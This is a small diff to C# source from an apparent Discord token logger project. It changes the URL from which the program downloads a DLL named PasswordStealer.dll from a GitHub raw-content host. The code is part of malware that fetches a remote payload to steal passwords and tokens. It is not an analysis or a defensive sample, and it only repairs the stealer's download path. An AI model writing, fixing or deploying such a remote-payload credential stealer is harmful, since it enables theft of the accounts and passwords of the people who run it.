@@ -152,7 +152,7 @@ namespace logger
             {
                 try
                 {
-                    dll = client.DownloadData("https://raw.githubusercontent.com/fknMega/Discord-Token-Logger/master/PasswordStealer.dll");
+                    dll = client.DownloadData("https://raw.githubusercontent.com/fknMega/Discord-Token-Logger/master/logger/PasswordStealer.dll");
                 }
                 catch (WebException ex)
                 {
